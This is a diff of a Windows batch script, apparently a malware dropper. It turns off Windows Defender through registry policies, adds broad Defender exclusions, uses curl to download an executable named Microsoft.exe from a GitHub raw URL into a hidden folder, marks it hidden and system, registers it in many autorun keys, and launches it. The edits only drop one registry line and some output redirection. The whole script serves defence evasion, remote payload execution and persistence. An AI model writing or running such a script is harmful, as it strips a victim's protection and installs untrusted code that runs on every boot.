@@ -37,7 +37,6 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpywa
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >nul
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >nul
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f >nul
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >nul
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >nul
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >nul
@@ -112,13 +111,13 @@ powershell Set-ExecutionPolicy -ExecutionPolicy RemoteSigned >nul
 powershell Add-MpPreference -ExclusionPath 'C:\*.exe' >nul
  
 REM Exclude hidden folder from Windows Defender
-powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\Microsoft.exe'" >nul
+powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\Microsoft.exe'"
 
 REM Download payload files to hidden folder using curl
-curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder2%\Microsoft.exe" >nul
+curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder2%\Microsoft.exe"
 
 REM Set hidden attribute for files
-attrib +h +s "%hiddenFolder2%\Microsoft.exe" >nul
+attrib +h +s "%hiddenFolder2%\Microsoft.exe"
 
 REM Add registry key to start Microsoft.exe on boot
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft.exe" /t REG_SZ /d "%hiddenFolder2%\Microsoft.exe" /f >nul
@@ -135,6 +134,6 @@ reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices 
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
 
-start /B Microsoft.exe" >nul
+start /B Microsoft.exe"
 
 goto :eof
